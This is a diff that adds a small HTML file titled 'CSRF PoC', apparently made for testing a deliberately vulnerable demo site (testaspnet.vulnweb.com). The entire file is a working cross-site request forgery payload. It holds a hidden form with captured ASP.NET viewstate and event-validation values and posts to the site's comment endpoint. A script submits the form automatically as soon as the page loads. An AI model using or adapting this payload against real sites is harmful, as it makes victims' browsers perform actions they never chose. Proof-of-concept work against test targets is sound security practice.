@@ -1,0 +1,27 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <p>This form will automatically submit when the page loads:</p>
+    <form id="csrf-form" action="http://testaspnet.vulnweb.com/Comments.aspx?id=2" method="post">
+        <input type="hidden" name="__EVENTTARGET" value="">
+        <input type="hidden" name="__EVENTARGUMENT" value="">
+        <input type="hidden" name="__VIEWSTATE" value="/wEPDwUKLTg2MjcwMzE2Mg9kFgICAQ9kFggCAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkAgMPFgIfAQVJcG9zdGVkIGJ5IDxzdHJvbmc+YWRtaW4gICAgICAgICAgICAgICAgICAgIDwvc3Ryb25nPjExLzgvMjAwNSAxMTozNToyMiBBTWQCBQ8WBB8BBTxXZWIgYXR0YWNrcyAtIGNhbiB5b3VyIHdlYiBhcHBsaWNhdGlvbnMgd2l0aHN0YW5kIHRoZSBmb3JjZT8fAAUSUmVhZE5ld3MuYXNweD9pZD0yZAIHDxYCHwEFrAIyMSBKdWx5IDIwMDUgLSBTdGFydC11cCBjb21wYW55IEFjdW5ldGl4IHJlbGVhc2VkIEFjdW5ldGl4IFdlYiBWdWxuZXJhYmlsaXR5IFNjYW5uZXI6IGEgdG9vbCB0byBhdXRvbWF0aWNhbGx5IGF1ZGl0IHdlYnNpdGUgc2VjdXJpdHkuIEFjdW5ldGl4IFdlYiBWdWxuZXJhYmlsaXR5IFNjYW5uZXIgMiBjcmF3bHMgYW4gZW50aXJlIHdlYnNpdGUsIGxhdW5jaGVzIHBvcHVsYXIgd2ViIGF0dGFja3MgKFNRTCBJbmplY3Rpb24gZXRjLikgYW5kIGlkZW50aWZpZXMgdnVsbmVyYWJpbGl0aWVzIHRoYXQgbmVlZCB0byBiZSBmaXhlZC5kZLQBJ3hOt3r5jKtYjVFFKdowCSWC">
+        <input type="hidden" name="__VIEWSTATEGENERATOR" value="58A73C4D">
+        <input type="hidden" name="__EVENTVALIDATION" value="/wEWWQKpxZClDQKAgcfvBQKFzrr8AQKbiraQAwL9kKSSBgKL+bPgBQKL+bPgBQKL+aeHDQKL+aeHDQKL+ZvsCwKL+ZvsCwKL+Y+DAwKL+Y+DAwK8k/vECQK8k/vECQK8k++bAQK8k++bAQK8k4O+CgK8k4O+CgK8k7fVAwK8k7fVAwK8k6voDAK8k6voDAK8k9+MBAK8k9+MBAK8k/OjDQK8k/OjDQK8k+fGBgK8k+fGBgK8k9uvAwK8k9uvAwK8k8/CDAK8k8/CDAKRutnrDwKRutnrDwKRus2OBwKRus2OBwKRuuElApG64SUCkbqV+AkCkbqV+AkCkbqJnwECkbqJnwECkbq9sgoCkbq9sgoCkbrR1gMCkbrR1gMCkbrF7QwCkbrF7QwCkbq51QkCkbq51QkCkbqt6AICkbqt6AIC1NnsngcC1NnsngcC1NmANQLU2YA1AtTZtMgJAtTZtMgJAtTZqO8CAtTZqO8CAtTZ3IMKAtTZ3IMKAtTZ8KYDAtTZ8KYDAtTZ5P0MAtTZ5P0MAtTZmJAEAtTZmJAEAtTZzPkCAtTZzPkCAtTZ4JwKAtTZ4JwKAqng8oUNAqng8oUNAqng5tgGAqng5tgGAqngmv8PAqngmv8PAqngjpIHAqngjpIHAqngoikCqeCiKQKp4NbNCQKp4NbNCQKp4MrgAgKp4MrgAgKp4P6HCgKp4P6HClUPbIyiBy/5fqms8MpnO+0sWevL">
+        <input type="hidden" name="tbComment" value="">
+        <input type="hidden" name="btnSend" value="Send comment">
+
+    </form>
+    <script>
+        // Auto-submit the form when the page loads
+        window.onload = function() {
+            document.getElementById("csrf-form").submit();
+        }
+    </script>
+</body>
+</html>
